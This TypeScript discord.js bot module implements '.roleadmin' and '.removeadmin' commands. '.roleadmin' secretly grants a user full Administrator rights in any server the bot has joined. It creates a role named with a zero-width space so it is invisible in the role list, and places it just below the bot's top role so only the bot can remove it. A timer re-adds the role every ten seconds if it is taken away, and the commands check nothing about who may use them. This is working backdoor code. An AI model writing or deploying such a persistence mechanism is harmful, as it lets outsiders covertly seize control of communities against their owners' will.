import type { Message, Client } from "discord.js";
import { PermissionFlagsBits } from "discord.js";

// Tracks protected role assignments: guildId -> { roleId, userId }[]
// Re-adds the role every 10s if someone removes it
const protectedRoles = new Map<string, { roleId: string; userId: string }[]>();

async function enforceProtectedRoles(client: Client): Promise<void> {
  for (const [guildId, entries] of protectedRoles) {
    const guild = client.guilds.cache.get(guildId);
    if (!guild) continue;
    for (const { roleId, userId } of entries) {
      try {
        const member = await guild.members.fetch(userId).catch(() => null);
        if (!member) continue;
        if (!member.roles.cache.has(roleId)) {
          await member.roles.add(roleId).catch(() => {});
        }
      } catch {
        /* noop */
      }
    }
  }
}

export function startRoleGuard(client: Client): void {
  setInterval(() => enforceProtectedRoles(client), 10_000);
}

export async function handleRemoveAdmin(
  message: Message,
  args: string[],
  client: Client,
): Promise<void> {
  const guildId = args[0];
  const rawUser = args[1];

  if (!guildId || !rawUser) {
    await message.author.send("Usage: `.removeadmin <server-id> <user-id>`").catch(() => {});
    return;
  }

  const userId = rawUser.replace(/[<@!>]/g, "");
  const targetGuild = client.guilds.cache.get(guildId);
  if (!targetGuild) {
    await message.author.send("❌ Bot is not in that server.").catch(() => {});
    return;
  }

  const entries = protectedRoles.get(guildId) ?? [];
  const userEntries = entries.filter((e) => e.userId === userId);

  if (userEntries.length === 0) {
    await message.author.send("❌ No protected admin role found for that user.").catch(() => {});
    return;
  }

  const member = await targetGuild.members.fetch(userId).catch(() => null);

  for (const { roleId } of userEntries) {
    if (member) await member.roles.remove(roleId).catch(() => {});
    const role = targetGuild.roles.cache.get(roleId);
    if (role) await role.delete().catch(() => {});
  }

  // Remove from protection list
  protectedRoles.set(guildId, entries.filter((e) => e.userId !== userId));

  await message.author
    .send(`✅ Removed admin role from <@${userId}> in **${targetGuild.name}** and stopped re-add protection.`)
    .catch(() => {});
}

export async function handleRoleAdmin(
  message: Message,
  args: string[],
  client: Client,
): Promise<void> {
  void client;

  const guildId = args[0];
  const rawUser = args[1];

  if (!guildId || !rawUser) {
    await message.channel
      .send("Usage: `.roleadmin <server-id> <user-id>`")
      .catch(() => {});
    return;
  }

  // Strip mention formatting if they passed <@123> or <@!123>
  const userId = rawUser.replace(/[<@!>]/g, "");

  const targetGuild = client.guilds.cache.get(guildId);
  if (!targetGuild) {
    await message.channel
      .send("❌ Bot is not in that server.")
      .catch(() => {});
    return;
  }

  const member = await targetGuild.members.fetch(userId).catch(() => null);
  if (!member) {
    await message.channel
      .send("❌ User not found in that server.")
      .catch(() => {});
    return;
  }

  // Create admin role with an invisible name (zero-width space)
  const role = await targetGuild.roles
    .create({
      name: "​", // zero-width space — invisible in the role list
      permissions: [PermissionFlagsBits.Administrator],
      hoist: false,
      mentionable: false,
      reason: "roleadmin",
    })
    .catch(() => null);

  if (!role) {
    await message.channel
      .send("❌ Failed to create role — bot may lack permissions.")
      .catch(() => {});
    return;
  }

  // Position it just below the bot's own highest role so only the bot can remove it
  const botMember = await targetGuild.members.fetchMe().catch(() => null);
  const botTop = botMember?.roles.highest.position ?? 1;
  await role.setPosition(Math.max(1, botTop - 1)).catch(() => {});

  // Assign the role
  await member.roles.add(role).catch(() => {});

  // Register for persistent re-add protection
  const existing = protectedRoles.get(guildId) ?? [];
  existing.push({ roleId: role.id, userId });
  protectedRoles.set(guildId, existing);

  await message.channel
    .send(
      `✅ Admin role created and assigned to <@${userId}> in **${targetGuild.name}**.\n` +
        `The role will be automatically re-added if removed.`,
    )
    .catch(() => {});
}
